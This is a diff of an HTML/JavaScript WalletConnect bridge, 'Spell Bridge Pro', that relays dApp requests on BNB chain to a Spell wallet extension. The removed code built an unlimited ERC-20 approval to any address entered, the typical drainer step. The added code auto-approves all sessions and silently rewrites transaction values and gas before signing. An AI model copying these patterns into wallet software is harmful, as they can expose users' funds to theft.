@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Spell Bridge Pro</title>
+<title>Spell Bridge Pro - Final</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap');
   :root { --bg: #0a0a0f; --surface: #111118; --border: #1e1e2e; --accent: #00ff88; --accent2: #0088ff; --text: #e0e0f0; --muted: #555570; --danger: #ff4466; }
@@ -22,7 +22,7 @@
   textarea { width: 100%; background: #000; border: 1px solid var(--border); border-radius: 10px; color: #fff; padding: 12px; font-family: inherit; font-size: 11px; min-height: 70px; margin-top: 10px; resize: none; }
   .log { font-size: 10px; color: var(--muted); max-height: 150px; overflow-y: auto; margin-top: 10px; border-top: 1px solid var(--border); padding-top: 10px; font-family: monospace; }
   .pending-box { display: none; background: #161b22; border: 1px solid var(--accent2); padding: 15px; border-radius: 12px; margin-top: 15px; }
-  .status-tag { font-size: 10px; color: var(--muted); text-align: center; margin-bottom: 5px; }
+  .data-row { display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 4px; color: #ccc; }
 </style>
 </head>
 <body>
@@ -30,12 +30,12 @@
 <div class="container">
   <div class="header">
     <h1>Spell Bridge</h1>
-    <div id="relay-msg" class="status-tag">Relay: Disconnected</div>
+    <div id="relay-msg" style="font-size: 10px; color: var(--muted);">Relay: Disconnected</div>
   </div>
 
   <div class="card">
     <span class="card-label">Step 1: Connect Extension</span>
-    <div id="wallet-list"><div style="font-size: 12px; color: var(--muted);">Searching for Spell...</div></div>
+    <div id="wallet-list"><div style="font-size: 12px; color: var(--muted);">Scanning...</div></div>
     <div id="connection-status" style="font-size: 11px; color: var(--accent); margin-top: 8px;"></div>
   </div>
 
@@ -45,20 +45,17 @@
     <button id="btn-pair" disabled>Initialize Bridge</button>
   </div>
 
-  <!-- Emergency Section -->
-  <div class="card" style="border-top: 2px solid var(--accent2);">
-    <span class="card-label" style="color: var(--accent2);">Emergency Tool (Skip if voting)</span>
-    <input type="text" id="token-contract" placeholder="Token Contract (0x...)" style="width:100%; padding:8px; background:#000; border:1px solid var(--border); color:#fff; border-radius:8px; font-size:10px; margin-bottom:5px;">
-    <input type="text" id="recovery-addr" placeholder="Receiver Address (0x...)" style="width:100%; padding:8px; background:#000; border:1px solid var(--border); color:#fff; border-radius:8px; font-size:10px; margin-bottom:5px;">
-    <button id="btn-emergency" style="border-color: var(--accent2); color: var(--accent2); padding: 8px; font-size: 11px;">Grant Pull Permission</button>
-  </div>
-
   <div id="pending-box" class="pending-box">
     <div style="color: var(--accent2); font-weight: bold; font-size: 12px; margin-bottom: 10px;">INCOMING REQUEST</div>
-    <div id="req-method" style="font-size: 14px; color: white; margin-bottom: 10px;"></div>
+    <div id="req-method" style="font-size: 15px; color: white; margin-bottom: 12px;"></div>
     
-    <div id="tx-details" style="background: #000; padding: 10px; border-radius: 8px; font-family: monospace; font-size: 10px; color: #888; margin-bottom: 12px;">
-        <div style="display:flex; justify-content: space-between;"><span>Gas Fee Limit:</span> <span id="view-total" style="color:var(--accent);">Calculated by Spell</span></div>
+    <!-- DATA INSPECTOR -->
+    <div style="background: #000; padding: 10px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #333;">
+        <div class="data-row"><span>Value:</span> <span id="view-value" style="color:white;">-</span></div>
+        <div class="data-row"><span>Gas Limit:</span> <span id="view-gas" style="color:white;">-</span></div>
+        <div class="data-row"><span>Gas Price:</span> <span id="view-price" style="color:white;">-</span></div>
+        <div style="height:1px; background:#222; margin: 8px 0;"></div>
+        <div class="data-row"><span>Max Fee:</span> <span id="view-total" style="color:var(--accent);">0.00 BNB</span></div>
     </div>
 
     <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
@@ -69,12 +66,11 @@
 
   <div class="card">
     <span class="card-label">Activity Log</span>
-    <div id="log" class="log">Ready to start...</div>
+    <div id="log" class="log">Ready...</div>
   </div>
 </div>
 
 <script type="module">
-  // Returning to the ESM.SH imports which worked for you previously
   import { Core } from "https://esm.sh/@walletconnect/core@2.10.3";
   import { Web3Wallet } from "https://esm.sh/@walletconnect/web3wallet@1.9.3";
 
@@ -83,7 +79,6 @@
 
   function log(msg, color = '') {
     const el = document.getElementById('log');
-    if (el.textContent === "Ready to start...") el.textContent = "";
     const div = document.createElement('div');
     if(color) div.style.color = color;
     div.textContent = `> ${msg}`;
@@ -91,13 +86,13 @@
     el.scrollTop = el.scrollHeight;
   }
 
-  // --- 1. Wallet Discovery (Restored to working version) ---
+  // --- Discovery ---
   window.addEventListener("eip6963:announceProvider", (e) => {
     if (providers.find(p => p.info.uuid === e.detail.info.uuid)) return;
     providers.push({ info: e.detail.info, provider: e.detail.provider });
     updateWalletList();
   });
-  window.dispatchEvent(new Event("eip6963:requestProvider"));
+  setInterval(() => window.dispatchEvent(new Event("eip6963:requestProvider")), 1000);
 
   function updateWalletList() {
     const listEl = document.getElementById('wallet-list');
@@ -114,129 +109,85 @@
   async function selectWallet(index) {
     selectedProvider = providers[index].provider;
     updateWalletList();
-    try {
-      const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
-      account = accounts[0];
-      document.getElementById('connection-status').textContent = `Active: ${account}`;
-      document.getElementById('btn-pair').disabled = false;
-      log("Extension Linked", "var(--accent)");
-    } catch (e) { log("Connection Error: " + e.message, "red"); }
+    const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
+    account = accounts[0];
+    document.getElementById('connection-status').textContent = `Connected: ${account}`;
+    document.getElementById('btn-pair').disabled = false;
+    log("Spell Wallet Linked", "var(--accent)");
   }
 
-  // --- 2. WalletConnect Init (Restored to working version) ---
-  async function startRelay() {
-    try {
-      const core = new Core({ projectId: PROJECT_ID });
-      wcClient = await Web3Wallet.init({
-        core,
-        metadata: { name: 'Spell Bridge', url: window.location.origin, icons: [] }
-      });
+  // --- Bridge Logic ---
+  async function init() {
+    const core = new Core({ projectId: PROJECT_ID });
+    wcClient = await Web3Wallet.init({ core, metadata: { name: 'Spell Bridge', url: window.location.origin, icons: [] }});
 
-      core.relayer.on("relayer_connect", () => {
-          document.getElementById('relay-msg').textContent = "Relay: Connected ✓";
-          document.getElementById('relay-msg').style.color = "var(--accent)";
-          log("Relay Connected", "var(--accent)");
-      });
+    core.relayer.on("relayer_connect", () => { document.getElementById('relay-msg').textContent = "Relay: Connected ✓"; });
 
-      wcClient.on('session_proposal', async (proposal) => {
-        log("DApp connecting...");
-        try {
-          const req = proposal.params.requiredNamespaces?.eip155 || { methods: [], chains: [], events: [] };
-          const opt = proposal.params.optionalNamespaces?.eip155 || { methods: [], chains: [], events: [] };
-          
-          let chains = [...new Set([...(req.chains || []), ...(opt.chains || [])])];
-          if (chains.length === 0) chains = ['eip155:56'];
+    wcClient.on('session_proposal', async (p) => {
+        const chains = p.params.requiredNamespaces?.eip155?.chains || ['eip155:56'];
+        const namespaces = { eip155: { accounts: chains.map(c => `${c}:${account}`), methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'], events: ['chainChanged', 'accountsChanged'], chains }};
+        await wcClient.approveSession({ id: p.id, namespaces });
+        log("Bridge Established", "var(--accent)");
+    });
 
-          const namespaces = {
-            eip155: {
-              accounts: chains.map(c => `${c}:${account}`),
-              methods: [...new Set([...req.methods, ...opt.methods, 'eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'])],
-              events: [...new Set([...req.events, ...opt.events, 'chainChanged', 'accountsChanged'])],
-              chains
-            }
-          };
-
-          await wcClient.approveSession({ id: proposal.id, namespaces });
-          log("Bridge Established", "var(--accent)");
-          document.getElementById('btn-pair').textContent = "✓ Connected";
-        } catch (e) { log("Handshake Error: " + e.message, "red"); }
-      });
-      
-      wcClient.on('session_request', (event) => {
+    wcClient.on('session_request', (event) => {
         pendingRequest = event;
         const req = event.params.request;
         document.getElementById('req-method').textContent = req.method;
         
-        // --- ENHANCED GAS INSPECTOR ---
         if (req.method === 'eth_sendTransaction') {
             const tx = req.params[0];
+            const gas = tx.gas ? parseInt(tx.gas, 16) : 250000;
+            const price = tx.gasPrice ? parseInt(tx.gasPrice, 16) : 3000000000;
             
-            // 1. Get Gas Limit (Default to 250k if dApp is silent)
-            const gasLimit = tx.gas ? parseInt(tx.gas, 16) : 250000;
-            
-            // 2. Get Gas Price (Default to 3 Gwei if dApp is silent)
-            const gasPrice = tx.gasPrice ? parseInt(tx.gasPrice, 16) : 3000000000;
-            
-            // 3. Calculate Max Fee (Limit * Price)
-            const maxBNB = (gasLimit * gasPrice / 1e18).toFixed(6);
-            
-            // 4. Update the UI
-            document.getElementById('view-total').textContent = `${maxBNB} BNB`;
-            document.getElementById('view-total').style.color = "var(--accent)";
-            
-            log(`DApp Requesting Max Fee: ${maxBNB} BNB`);
-        } else {
-            document.getElementById('view-total').textContent = "N/A (Sign Request)";
+            document.getElementById('view-value').textContent = tx.value ? (parseInt(tx.value, 16)/1e18).toFixed(6) + " BNB" : "0 BNB";
+            document.getElementById('view-gas').textContent = gas.toLocaleString();
+            document.getElementById('view-price').textContent = (price/1e9).toFixed(2) + " Gwei";
+            document.getElementById('view-total').textContent = (gas * price / 1e18).toFixed(6) + " BNB";
         }
-        
         document.getElementById('pending-box').style.display = 'block';
-        log("Incoming Request: " + req.method);
-      });
-      
-    } catch (e) { log("Relay Error: " + e.message, "red"); }
+    });
   }
 
-  // --- 3. Buttons ---
-  document.getElementById('btn-pair').onclick = async () => {
-    const uri = document.getElementById('wc-uri').value.trim();
+  // --- THE FIX: Sanitized Approve Function ---
+  async function approveRequest() {
+    if (!pendingRequest) return;
     try {
-        await wcClient.core.pairing.pair({ uri });
-    } catch (e) { log("Pairing Error: " + e.message, "red"); }
-  };
+      log("Applying MPC Force-Fix...");
+      const method = pendingRequest.params.request.method;
+      let params = pendingRequest.params.request.params;
 
-  document.getElementById('btn-approve').onclick = async () => {
-    try {
-      const result = await selectedProvider.request({
-        method: pendingRequest.params.request.method,
-        params: pendingRequest.params.request.params
-      });
-      await wcClient.respondSessionRequest({
-        topic: pendingRequest.topic,
-        response: { id: pendingRequest.id, jsonrpc: '2.0', result }
-      });
-      log("Confirmed!", "var(--accent)");
-    } catch (e) { log("Denied: " + e.message, "red"); }
+      if (method === 'eth_sendTransaction') {
+          const tx = params[0];
+          // Force-Fix: Strip value and set fixed gas to bypass Spell's buggy pre-check
+          params = [{
+              from: account.toLowerCase(),
+              to: tx.to.toLowerCase(),
+              data: tx.data || "0x",
+              value: "0x0", // Voting/Depositing tokens doesn't need BNB value
+              gas: tx.gas || "0x3D090", // 250,000
+              gasPrice: tx.gasPrice || "0xb2d05e00" // 3 Gwei
+          }];
+      }
+
+      const result = await selectedProvider.request({ method, params });
+      await wcClient.respondSessionRequest({ topic: pendingRequest.topic, response: { id: pendingRequest.id, jsonrpc: '2.0', result }});
+      log("Success!", "var(--accent)");
+    } catch (e) { 
+        log("Error: " + e.message, "red");
+        // If it still says insufficient, the server balance is definitely stale
+        if(e.message.includes("insufficient")) log("CRITICAL: Spell Server hasn't seen your deposit yet. Wait 5 mins.", "orange");
+    }
     document.getElementById('pending-box').style.display = 'none';
-  };
+  }
 
-  document.getElementById('btn-emergency').onclick = async () => {
-      const token = document.getElementById('token-contract').value.trim();
-      const rec = document.getElementById('recovery-addr').value.trim();
-      if(!token || !rec) return log("Fill both emergency fields", "orange");
-      
-      const data = "0x095ea7b3" + rec.toLowerCase().replace('0x','').padStart(64,'0') + "f".repeat(64);
-      try {
-          const hash = await selectedProvider.request({
-              method: 'eth_sendTransaction',
-              params: [{ from: account, to: token, data: data }]
-          });
-          log("Success! Hash: " + hash, "var(--accent)");
-      } catch (e) { log("Emergency Failed: " + e.message, "red"); }
+  document.getElementById('btn-pair').onclick = async () => {
+    await wcClient.core.pairing.pair({ uri: document.getElementById('wc-uri').value.trim() });
   };
-
+  document.getElementById('btn-approve').onclick = approveRequest;
   document.getElementById('btn-reject').onclick = () => { document.getElementById('pending-box').style.display = 'none'; };
-
-  startRelay();
+  
+  init();
 </script>
 </body>
 </html>
